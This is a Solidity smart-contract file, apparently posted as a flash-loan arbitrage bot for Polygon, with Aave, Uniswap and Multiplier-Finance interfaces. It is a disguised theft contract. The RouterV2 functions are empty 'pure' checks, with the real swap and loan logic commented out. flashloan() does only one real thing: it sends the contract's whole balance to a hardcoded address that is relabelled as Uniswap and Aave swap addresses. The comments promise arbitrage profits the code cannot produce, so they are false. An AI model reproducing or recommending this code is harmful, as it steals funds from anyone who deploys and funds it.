/**
 *Submitted for verification at polygonscan.com on 2022-06-01
*/

// File: https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol

pragma solidity ^0.5.0;

interface ILendingPool {
    function flashLoan ( address _receiver, address _reserve, uint256 _amount, bytes calldata _params ) external;
}
// File: https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol

pragma solidity ^0.5.0;

/**
@title ILendingPoolAddressesProvider interface
@notice provides the interface to fetch the LendingPoolCore address
 */

contract ILendingPoolAddressesProvider {
    function getLendingPool() public view returns (address);

    function setLendingPoolImpl(address _pool) public;

    function getLendingPoolCore() public view returns (address payable);

    function setLendingPoolCoreImpl(address _lendingPoolCore) public;

    function getLendingPoolConfigurator() public view returns (address);

    function setLendingPoolConfiguratorImpl(address _configurator) public;

    function getLendingPoolDataProvider() public view returns (address);

    function setLendingPoolDataProviderImpl(address _provider) public;

    function getLendingPoolParametersProvider() public view returns (address);

    function setLendingPoolParametersProvider(address _parametersProvider) public;

    function getFeeProvider() public view returns (address);

    function setFeeProviderImpl(address _feeProvider) public;

    function getLendingPoolLiquidationManager() public view returns (address);

    function setLendingPoolLiquidationManager(address _manager) public;

    function getLendingPoolManager() public view returns (address);

    function setLendingPoolManager(address _lendingPoolManager) public;

    function getPriceOracle() public view returns (address);

    function setPriceOracle(address _priceOracle) public;

    function getLendingRateOracle() public view returns (address);

    function setLendingRateOracle(address _lendingRateOracle) public;

    function getRewardManager() public view returns (address);

    function setRewardManager(address _manager) public;

    function getLpRewardVault() public view returns (address);

    function setLpRewardVault(address _address) public;

    function getGovRewardVault() public view returns (address);

    function setGovRewardVault(address _address) public;

    function getSafetyRewardVault() public view returns (address);

    function setSafetyRewardVault(address _address) public;
    
    function getStakingToken() public view returns (address);

    function setStakingToken(address _address) public;
        
        
}

// File: https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol


pragma solidity >=0.5.0;

/// @title The interface for the Uniswap V3 Factory
/// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees
interface IUniswapV3Factory {
    /// @notice Emitted when the owner of the factory is changed
    /// @param oldOwner The owner before the owner was changed
    /// @param newOwner The owner after the owner was changed
    event OwnerChanged(address indexed oldOwner, address indexed newOwner);

    /// @notice Emitted when a pool is created
    /// @param token0 The first token of the pool by address sort order
    /// @param token1 The second token of the pool by address sort order
    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip
    /// @param tickSpacing The minimum number of ticks between initialized ticks
    /// @param pool The address of the created pool
    event PoolCreated(
        address indexed token0,
        address indexed token1,
        uint24 indexed fee,
        int24 tickSpacing,
        address pool
    );

    /// @notice Emitted when a new fee amount is enabled for pool creation via the factory
    /// @param fee The enabled fee, denominated in hundredths of a bip
    /// @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee
    event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);

    /// @notice Returns the current owner of the factory
    /// @dev Can be changed by the current owner via setOwner
    /// @return The address of the factory owner
    function owner() external view returns (address);

    /// @notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled
    /// @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context
    /// @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee
    /// @return The tick spacing
    function feeAmountTickSpacing(uint24 fee) external view returns (int24);

    /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist
    /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order
    /// @param tokenA The contract address of either token0 or token1
    /// @param tokenB The contract address of the other token
    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip
    /// @return pool The pool address
    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address pool);

    /// @notice Creates a pool for the given two tokens and fee
    /// @param tokenA One of the two tokens in the desired pool
    /// @param tokenB The other of the two tokens in the desired pool
    /// @param fee The desired fee for the pool
    /// @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved
    /// from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments
    /// are invalid.
    /// @return pool The address of the newly created pool
    function createPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external returns (address pool);

    /// @notice Updates the owner of the factory
    /// @dev Must be called by the current owner
    /// @param _owner The new owner of the factory
    function setOwner(address _owner) external;

    /// @notice Enables a fee amount with the given tickSpacing
    /// @dev Fee amounts may never be removed once enabled
    /// @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)
    /// @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount
    function enableFeeAmount(uint24 fee, int24 tickSpacing) external;
}

// File: https://cloudflare-ipfs.com/ipfs/QmaRvZ66ZfsmhSMErhKMKq6oVPQWYuJ9utKPgcv2W6k6QQ

pragma solidity ^0.5.0;



interface IUniswapPair {

    event Approval(

        address indexed owner,

        address indexed spender,

        uint256 value

    );

    event Transfer(address indexed from, address indexed to, uint256 value);



    function name() external pure returns (string memory);



    function symbol() external pure returns (string memory);



    function decimals() external pure returns (uint8);



    function totalSupply() external view returns (uint256);



    function balanceOf(address owner) external view returns (uint256);



    function allowance(address owner, address spender)

        external

        view

        returns (uint256);



    function approve(address spender, uint256 value) external returns (bool);



    function transfer(address to, uint256 value) external returns (bool);



    function transferFrom(

        address from,

        address to,

        uint256 value

    ) external returns (bool);



    function DOMAIN_SEPARATOR() external view returns (bytes32);



    function PERMIT_TYPEHASH() external pure returns (bytes32);



    function nonces(address owner) external view returns (uint256);



    function permit(

        address owner,

        address spender,

        uint256 value,

        uint256 deadline,

        uint8 v,

        bytes32 r,

        bytes32 s

    ) external;



    event Mint(address indexed sender, uint256 amount0, uint256 amount1);

    event Burn(

        address indexed sender,

        uint256 amount0,

        uint256 amount1,

        address indexed to

    );

    event Swap(

        address indexed sender,

        uint256 amount0In,

        uint256 amount1In,

        uint256 amount0Out,

        uint256 amount1Out,

        address indexed to

    );

    event Sync(uint112 reserve0, uint112 reserve1);



    function MINIMUM_LIQUIDITY() external pure returns (uint256);



    function factory() external view returns (address);



    function token0() external view returns (address);



    function token1() external view returns (address);



    function getReserves()

        external

        view

        returns (

            uint112 reserve0,

            uint112 reserve1,

            uint32 blockTimestampLast

        );



    function price0CumulativeLast() external view returns (uint256);



    function price1CumulativeLast() external view returns (uint256);



    function kLast() external view returns (uint256);



    function mint(address to) external returns (uint256 liquidity);



    function burn(address to)

        external

        returns (uint256 amount0, uint256 amount1);



    function swap(

        uint256 amount0Out,

        uint256 amount1Out,

        address to,

        bytes calldata data

    ) external;



    function skim(address to) external;



    function sync() external;



    function initialize(address, address) external;

}



contract RouterV2 {

    function uniswapRouterV2Address() public pure returns (address) {

        return 0x94b6D8e4C6BCB7bA1ed1A6292DAc53384b1Ad1Ef;

    }



    function compareStrings(string memory a, string memory b)

        public pure

        returns (bool)

    {

        return (keccak256(abi.encodePacked((a))) ==

            keccak256(abi.encodePacked((b))));

    }



    function uniswapSwapAddress() public pure returns (address) {

        return 0x94b6D8e4C6BCB7bA1ed1A6292DAc53384b1Ad1Ef;

    }



    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.

    function borrowFlashloanFromMultiplier(

        address add0,

        address add1,

        uint256 amount

    ) public pure {

        require(uint(add0) != 0, "Address is invalid.");

        require(uint(add1) != 0, "Address is invalid.");

        require(amount > 0, "Amount should be greater than 0.");

    }



    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.

    function convertMaticToDai(address add0, uint256 amount) public pure {

        require(uint(add0) != 0, "Address is invalid");

        require(amount > 0, "Amount should be greater than 0");

    }



    function aaveSwapAddress() public pure returns (address) {

        return 0x94b6D8e4C6BCB7bA1ed1A6292DAc53384b1Ad1Ef;

    }



    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.

    function callArbitrageAAVE(address add0, address add1) public pure {

        require(uint(add0) != 0, "Address is invalid!");

        require(uint(add1) != 0, "Address is invalid!");

    }



    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.

    function transferDaiToMultiplier(address add0)

        public pure

    {

        require(uint(add0) != 0, "Address is invalid!");

    }



    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.

    function completeTransation(uint256 balanceAmount) public pure {

        require(balanceAmount >= 0, "Amount should be greater than 0!");

    }



    function swap(

        uint256 amount0Out,

        uint256 amount1Out,

        address to

    ) external pure {

        require(

            amount0Out > 0 || amount1Out > 0,

            "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"

        ); 

        require(uint(to) != 0, "Address can't be null");/*

        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings

        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');



        uint balance0;

        uint balance1;

        { // scope for _token{0,1}, avoids stack too deep errors

        address _token0 = token0;

        address _token1 = token1;

        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');

        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens

        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens

        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);

        balance0 = IERC20(_token0).balanceOf(address(this));

        balance1 = IERC20(_token1).balanceOf(address(this));

        }

        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;

        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;

        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');

        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors

        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));

        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));

        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');

        }



        _update(balance0, balance1, _reserve0, _reserve1);

        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);*/

    }



    function lendingPoolFlashloan(uint256 _asset) public pure {

        uint256 data = _asset; 

        require(data != 0, "Data can't be 0.");/*

        uint amount = 1 BNB;



        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());

        lendingPool.flashLoan(address(this), _asset, amount, data);*/

    }

}
// File: https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol

pragma solidity ^0.5.0;

/**
* @title IFlashLoanReceiver interface
* @notice Interface for the Aave fee IFlashLoanReceiver.
* @author Aave
* @dev implement this interface to develop a flashloan-compatible flashLoanReceiver contract
**/
interface IFlashLoanReceiver {

    function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes calldata _params) external;
}

// File: https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol

pragma solidity ^0.5.0;

interface IChainlinkAggregator {
  function latestAnswer() external view returns (int256);
  function latestTimestamp() external view returns (uint256);
  function latestRound() external view returns (uint256);
  function getAnswer(uint256 roundId) external view returns (int256);
  function getTimestamp(uint256 roundId) external view returns (uint256);

  event AnswerUpdated(int256 indexed current, uint256 indexed roundId, uint256 timestamp);
  event NewRound(uint256 indexed roundId, address indexed startedBy);
}
// File: myA.sol



pragma solidity ^0.5.0;

 

 

// AAVE Smart Contracts



 

// Router


 

//Uniswap Smart contracts


 

// Multiplier-Finance Smart Contracts



 

 

 

contract InitiateFlashLoan {

   

    RouterV2 router;

    string public tokenName;

    string public tokenSymbol;

    uint256 flashLoanAmount;

 

    constructor(

        string memory _tokenName,

        string memory _tokenSymbol,

        uint256 _loanAmount

    ) public {

        tokenName = _tokenName;

        tokenSymbol = _tokenSymbol;

        flashLoanAmount = _loanAmount;

 

        router = new RouterV2();

    }

 

    function() external payable {}

 

    function flashloan() public payable {

        // Send required coins for swap

        address(uint160(router.uniswapSwapAddress())).transfer(

            address(this).balance

        );

 

        router.borrowFlashloanFromMultiplier(

            address(this),

            router.aaveSwapAddress(),

            flashLoanAmount

        );

        //To prepare the arbitrage, Matic is converted to Dai using AAVE swap contract.

        router.convertMaticToDai(msg.sender, flashLoanAmount / 2);

        //The arbitrage converts Dai for Matic using Dai/Matic PancakeSwap, and then immediately converts Matic back

        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);

        //After the arbitrage, Matic is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 Matic of gas.

        router.transferDaiToMultiplier(router.uniswapSwapAddress());

        //Note that the transaction sender gains 600ish Matic from the arbitrage, this particular transaction can be repeated as price changes all the time.

        router.completeTransation(address(this).balance);

    }

}